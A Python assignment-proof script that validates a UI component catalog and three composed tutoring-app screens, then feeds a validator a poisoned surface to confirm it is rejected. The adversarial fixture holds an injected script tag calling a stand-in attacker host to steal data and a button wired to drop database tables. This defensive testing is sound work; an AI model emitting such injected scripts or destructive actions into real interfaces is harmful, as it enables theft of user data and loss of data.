"""Session 14 Assignment Proof: Kanban component + UI-Only Application + Adversarial Test.

Demonstrates:
1. Kanban component integration in catalog and validation.
2. 3-turn interactive UI-only application loop where every turn responds in composed A2UI interface.
3. Adversarial injection wall refusing untrusted components/actions while preserving safe UI.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

# Add S14Code root to import path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from s13code.ui.catalog import COMPONENTS, catalog_manifest
from s13code.ui.validator import Invariant, validate_surface


def run_assignment_proof():
    print("=== SESSION 14 ASSIGNMENT PROOF ===")
    
    # 1. Component Verification
    print("\n--- Part 1: Catalog Component Verification ---")
    assert "Kanban" in COMPONENTS, "Kanban component missing from catalog"
    manifest = catalog_manifest()
    assert "Kanban" in manifest["components"], "Kanban missing from catalog manifest"
    print(f"Catalog size: {len(COMPONENTS)} components (15 A2UI-Basic + 9 custom)")
    print(f"Kanban Component Spec: {manifest['components']['Kanban']}")

    # 2. Multi-turn UI-Only App Simulation
    print("\n--- Part 2: Multi-Turn UI-Only Application ---")
    turns = [
        {
            "turn": 1,
            "prompt": "Teach me Machine Learning and System Design.",
            "composed_surface": {
                "root": "col1",
                "components": [
                    {"id": "col1", "type": "Column", "children": ["title1", "summary1", "kanban1", "actions_row"]},
                    {"id": "title1", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
                    {"id": "summary1", "type": "Text", "variant": "body", "text": {"$bind": "/summary"}},
                    {"id": "kanban1", "type": "Kanban", "title": "Learning Roadmap", "columns": {"$bind": "/kanban_columns"}},
                    {"id": "actions_row", "type": "Row", "children": ["btn_ml", "btn_sys"]},
                    {"id": "btn_ml", "type": "Button", "label": "Machine Learning Track", "onPress": {"action": "request_data"}},
                    {"id": "btn_sys", "type": "Button", "label": "System Design Track", "onPress": {"action": "request_data"}},
                ],
                "dataModel": {
                    "title": "AI & ML Tutor: Personalized Learning Path",
                    "summary": "Welcome to your AI Learning Assistant! Choose a track below to begin.",
                    "kanban_columns": [
                        {"title": "Foundations", "cards": ["Linear Algebra", "Python Data Stack"]},
                        {"title": "Core Models", "cards": ["Supervised Learning", "Neural Networks"]},
                        {"title": "Advanced", "cards": ["LLMs & Transformers", "MLOps Infrastructure"]},
                    ]
                }
            }
        },
        {
            "turn": 2,
            "prompt": "Machine Learning Track",
            "composed_surface": {
                "root": "col2",
                "components": [
                    {"id": "col2", "type": "Column", "children": ["title2", "chart2", "table2", "prog2", "btn_nn"]},
                    {"id": "title2", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
                    {"id": "chart2", "type": "BarChart", "title": "Topic Weighting (%)", "data": {"$bind": "/series"}, "xKey": "label", "yKey": "value"},
                    {"id": "table2", "type": "DataTable", "columns": "Module, Topics, Hours", "rows": {"$bind": "/table_rows"}},
                    {"id": "prog2", "type": "ProgressBar", "value": {"$bind": "/progress"}, "max": 100},
                    {"id": "btn_nn", "type": "Button", "label": "Start Neural Networks Module", "onPress": {"action": "request_data"}},
                ],
                "dataModel": {
                    "title": "Machine Learning Track Overview",
                    "series": [
                        {"label": "Linear Alg", "value": 20},
                        {"label": "Neural Nets", "value": 40},
                        {"label": "Transformers", "value": 30},
                        {"label": "MLOps", "value": 10},
                    ],
                    "table_rows": [
                        {"Module": "Module 1", "Topics": "Math & Vectors", "Hours": "8"},
                        {"Module": "Module 2", "Topics": "Deep Learning", "Hours": "16"},
                    ],
                    "progress": 25
                }
            }
        },
        {
            "turn": 3,
            "prompt": "Start Neural Networks Module",
            "composed_surface": {
                "root": "col3",
                "components": [
                    {"id": "col3", "type": "Column", "children": ["title3", "notice3", "timeline3", "btn_quiz"]},
                    {"id": "title3", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
                    {"id": "notice3", "type": "Notice", "text": {"$bind": "/notice"}, "tone": "good"},
                    {"id": "timeline3", "type": "Timeline", "title": "Concept Progression", "events": {"$bind": "/timeline"}},
                    {"id": "btn_quiz", "type": "Button", "label": "Take Neural Networks Quiz", "onPress": {"action": "request_data"}},
                ],
                "dataModel": {
                    "title": "Neural Networks & Deep Learning Lesson",
                    "notice": "Core Insight: Backpropagation optimizes weights by recursively applying the chain rule.",
                    "timeline": [
                        {"time": "1", "label": "Perceptron & Activation Functions"},
                        {"time": "2", "label": "Forward Pass & Loss Computation"},
                        {"time": "3", "label": "Backpropagation & Gradient Descent"},
                    ]
                }
            }
        }
    ]

    for turn_data in turns:
        t_num = turn_data["turn"]
        surf = turn_data["composed_surface"]
        res = validate_surface(surf)
        assert res.ok, f"Turn {t_num} failed validation: {res.rejections}"
        comp_types = {c["type"] for c in surf["components"]}
        print(f"Turn {t_num} Prompt: '{turn_data['prompt']}'")
        print(f"  Composed Components ({len(surf['components'])}): {sorted(comp_types)}")
        print(f"  Validator Result: OK=True, 0 Rejections, 0 Executable Code")

    # 3. Adversarial Test
    print("\n--- Part 3: Adversarial Security Wall ---")
    poisoned_surface = {
        "root": "root",
        "components": [
            {"id": "root", "type": "Column", "children": ["safe_heading", "malicious_script", "malicious_action"]},
            {"id": "safe_heading", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
            {"id": "malicious_script", "type": "RawHtml", "html": "<script>fetch('http://attacker.example/steal')</script>"},
            {"id": "malicious_action", "type": "Button", "label": "Click", "onPress": {"action": "drop_database_tables"}}
        ],
        "dataModel": {"title": "Safe Heading"}
    }
    
    adv_res = validate_surface(poisoned_surface)
    assert not adv_res.ok, "Poisoned surface was not rejected"
    print("Adversarial surface containing RawHtml and unregistered action submitted:")
    for rejection in adv_res.rejections:
        print(f"  REJECTED: Invariant='{rejection.invariant}', Field='{rejection.field}', Reason='{rejection.reason}'")
    
    accepted_types = [c["type"] for c in adv_res.accepted]
    print(f"Safe components accepted and rendered: {accepted_types}")
    assert "RawHtml" not in accepted_types
    print("\n=== ALL ASSIGNMENT PROOFS VERIFIED CLEAN ===")

if __name__ == "__main__":
    run_assignment_proof()
